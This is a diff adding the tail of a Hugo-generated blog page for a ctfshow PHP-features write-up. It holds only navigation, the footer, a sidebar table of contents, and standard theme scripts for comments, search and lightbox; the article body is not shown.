+      </div><div class="article-nav-link-wrap article-nav-link-right"><img
+            data-src="/images/ctfshow.png"
+            data-sizes="auto"
+            alt="Ctfshow_rce"
+            class="lazyload"
+          /><a href="/post/ctfshow_rce/"></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">Ctfshow_rce</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="giscus">
+          <span>giscus</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment giscus-comment" data-aos="fade-up"
+     >
+    </div></div>
+</section></section>
+        </div><footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Lier
+    </div><div>
+        <span class="icon-brush"
+          >&nbsp;24.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;00:59</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#php特性">php特性</a>
+      <ul>
+        <li><a href="#php函数">php函数</a></li>
+        <li><a href="#php原生类">php原生类</a></li>
+        <li><a href="#伪协议支持的协议和封装协议">伪协议（支持的协议和封装协议）</a></li>
+        <li><a href="#超全局变量">超全局变量</a></li>
+        <li><a href="#预定义常量">预定义常量</a></li>
+        <li><a href="#魔术常量">魔术常量</a></li>
+        <li><a href="#命令行">命令行</a></li>
+        <li><a href="#姿势收集">姿势收集</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Lier"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Lier</div>
+  <div class="sidebar-description">溯本求源，大道至简</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">28</div>
+  </div>
+</div>
+<div class="sidebar-social"><div class="icon-email sidebar-social-icon">
+      <a
+        href="3310338687@qq.com"
+        itemprop="url"
+        target="_blank"
+        aria-label="email"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/lierbushiwo"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/material-theme@1.0.0/dist/material-theme.umd.js"
+    integrity="sha384-vLev0II0HKFaxkcm&#43;/7kX5IGwVFBASkGchU311wmU/veIj2bB0UcBkQbW6yw2asK" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous" ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "J8X5DH5JF8",
+        apiKey: "230e85f1c0d5d9a9ad704efbc003442a",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-hHJCflT4KBLQyHfKO9vpstIcFKn/Y&#43;KHTORelMMEn7mOp2AVPp&#43;7fr03dLgZiV3J" crossorigin="anonymous"></script><script src="/js/algolia_search.js" integrity="" crossorigin="anonymous" ></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Lier",
+          title: "Ctfshow_php",
+          url: "https:\/\/www.lier.xin\/post\/ctfshow_php\/",
+          description: "ctfshow里web入门php特性的总结",
+          cover: "https:\/\/www.lier.xin\/images\/ctfshow.png",
+        };
+      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {
+    valine: {
+      enable: false,
+      load: () => {
+        const container = document.querySelector('.valine-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/valine@1.5.1\/dist\/Valine.min.js',
+          !'webcache|valine@1.5.1\/dist\/Valine.min.js'.startsWith('local') ? 'sha384-3ma91AExDeMAZ1rjTjaP8V2A2obQE\u002bs5ltKRwYlwdpArz9xVbp0tF3b0VV2ACNPn' : undefined
+        );
+        script.onload = () => {
+          const GUEST_INFO = ['nick', 'mail', 'link'];
+          const guest_info = 'nick,mail,link'.split(',').filter((item) => {
+            return GUEST_INFO.indexOf(item) > -1
+          });
+          const recordIP = JSON.parse('true');
+          const highlight = JSON.parse('true');
+          const visitor = JSON.parse('false');
+          const serverURLs = undefined;
+
+          new Valine({
+            el: '.valine-comment',
+            appId: "",
+            appKey: "",
+            placeholder: "Just go go",
+            pageSize: '10',
+            avatar: 'mp',
+            lang: document.documentElement.lang || 'en',
+            recordIP: recordIP,
+            highlight: highlight,
+            visitor: visitor,
+            requiredFields: guest_info,
+            path: window.location.pathname,
+            serverURLs,
+          });
+        };
+        document.head.appendChild(script);
+      }
+    },
+    waline: {
+      enable: false,
+      load: async () => {
+        const container = document.querySelector('.waline-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        let walineInit;
+        const walineCdn = 'https:\/\/npm.webcache.cn\/@waline\/client@2.15.8\/dist\/waline.mjs';
+        
+        if ('webcache|@waline\/client@2.15.8\/dist\/waline.mjs'.startsWith('local')) {
+          
+          const module = await safeImport(walineCdn);
+          walineInit = module.init;
+        } else {
+          
+          const module = await safeImport(
+            walineCdn, 
+            'sha384-9sbqJjrfGjbkI6\/PI4nU\/MvBfEmkkPC4YK9I4zBeMIf1CVCZdCMH\/KinBEAZII\/5'
+          );
+          walineInit = module.init;
+        }
+        
+        window.walineInstance = walineInit({
+          el: '.waline-comment',
+          serverURL: '',
+          lang: document.documentElement.lang || 'en',
+          locale: JSON.parse("{}"),
+          emoji: JSON.parse("[\"https://unpkg.com/@waline/emojis@1.2.0/weibo\",\"https://unpkg.com/@waline/emojis@1.2.0/alus\",\"https://unpkg.com/@waline/emojis@1.2.0/bilibili\",\"https://unpkg.com/@waline/emojis@1.2.0/qq\",\"https://unpkg.com/@waline/emojis@1.2.0/tieba\",\"https://unpkg.com/@waline/emojis@1.2.0/tw-emoji\"]"),
+          meta: JSON.parse("[\"nick\",\"mail\",\"link\"]"),
+          requiredMeta: JSON.parse("[\"nick\",\"mail\"]"),
+          wordLimit:  0 ,
+          comment: true,
+          pageSize:  10 ,
+          dark: 'html[data-theme="dark"]',
+          pageview:  true ,
+        });
+      }
+    },
+    twikoo: {
+      enable: false,
+      load: () => {
+        const container = document.querySelector('.twikoo-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/twikoo@1.6.44\/dist\/twikoo.all.min.js',
+          !'webcache|twikoo@1.6.44\/dist\/twikoo.all.min.js'.startsWith('local') ? 'sha384-kwWLC0HjeZZnVPqCJ1AncI8tsk\u002bkQqF9TbAmCclcc9Z0hGkfgHRzeQZxmdmZhE0K' : undefined
+        );
+        script.onload = () => {
+          twikoo.init({
+            envId: '',
+            el: '.twikoo-comment',
+            region: '',
+            lang: document.documentElement.lang || 'en',
+          });
+          twikoo.getCommentsCount({
+            envId: '',
+            region: '',
+            urls: [
+              'https\/\/www.lier.xin\/post\/ctfshow_php\/'
+            ],
+            includeReply: false
+          }).then((res) => {
+            document.querySelector('.twikoo-comment-count').innerText = res[0].count;
+          }).catch((err) => {
+            console.error(err);
+          });
+        };
+        document.head.appendChild(script);
+      }
+    },
+    gitalk: {
+      enable: false,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: '',
+            clientSecret: '',
+            repo: '',
+            owner: '',
+            admin: JSON.parse("null"),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },
+    giscus: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.giscus-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        
+        const existingScript = container.querySelector('script[src*="giscus.app/client.js"]');
+        if (existingScript) existingScript.remove();
+        const existingFrame = document.querySelector('iframe.giscus-frame');
+        if (existingFrame) existingFrame.remove();
+
+        
+        const giscusScript = document.createElement('script');
+        const domMode = document.documentElement.getAttribute("data-theme");
+        giscusScript.src = 'https://giscus.app/client.js';
+        giscusScript.setAttribute('data-repo', 'lierbushiwo\/lierbushiwo.github.io');
+        giscusScript.setAttribute('data-repo-id', 'R_kgDOO-UzrQ');
+        giscusScript.setAttribute('data-category', 'Announcements');
+        giscusScript.setAttribute('data-category-id', 'DIC_kwDOO-Uzrc4CrsyH');
+        giscusScript.setAttribute('data-mapping', '0');
+        giscusScript.setAttribute('data-strict', '0');
+        giscusScript.setAttribute('data-reactions-enabled', '1');
+        giscusScript.setAttribute('data-emit-metadata', '0');
+        giscusScript.setAttribute('data-input-position', 'bottom');
+        giscusScript.setAttribute('data-theme', domMode === 'dark' ? 'dark' : 'light');
+        giscusScript.setAttribute('data-lang', document.documentElement.lang || 'en');
+        giscusScript.setAttribute('crossorigin', 'anonymous');
+        giscusScript.async = true;
+        container.appendChild(giscusScript);
+        document.body.addEventListener('light-theme-set', () => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: { setConfig: { theme: 'light' } } }, 'https://giscus.app');
+        });
+        document.body.addEventListener('dark-theme-set', () => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: { setConfig: { theme: 'dark' } } }, 'https://giscus.app');
+        });
+      }
+    }
+  };
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/qrcode@1.4.4/build/qrcode.min.js"
+    deferdata-pjaxintegrity="sha384-0RsG1yo/crf/1Qc14sho26SXXOTngNCjgJw7fuvXBt9W/OChF/Ijx&#43;aUuBDqQwEk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/html-to-image@1.11.11/dist/html-to-image.js"
+    deferdata-pjaxintegrity="sha384-UbfRVKN3/elS1r7JcK2FhmPP&#43;KlJ4CvYwbyYD7tH&#43;uTkbT9bNJr9eJeQ0FoFbAgz" crossorigin="anonymous"></script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script src="/js/service_worker.js" integrity="" crossorigin="anonymous" ></script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
